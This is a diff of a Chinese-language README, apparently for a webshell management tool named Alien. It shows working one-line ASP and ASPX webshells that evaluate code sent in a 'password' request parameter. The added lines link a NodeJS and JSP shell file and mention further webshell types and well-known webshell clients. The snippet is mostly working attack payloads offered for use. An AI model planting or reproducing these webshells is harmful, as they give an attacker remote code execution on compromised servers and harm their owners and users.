@@ -26,7 +26,9 @@ C# .NET Framework V4.8
 ```<%execute(request("password"))%>```
 - ASPX
 ```<%@ Page Language="Jscript"%><%eval(Request.Item["password"])%>```
-當然, Alien還可以使用asmx, ashx等等的Webshell。
+當然, Alien還可以使用asmx, ashx等等的Webshell。\
+- NodeJS & JSP
+```https://github.com/malbuffer4pt/Alien/blob/main/shell.txt```
 
 ## 關於JSP webshell
 目前只有比較原始的菜刀版本, 之後可能會加上蟻劍和冰蝎\
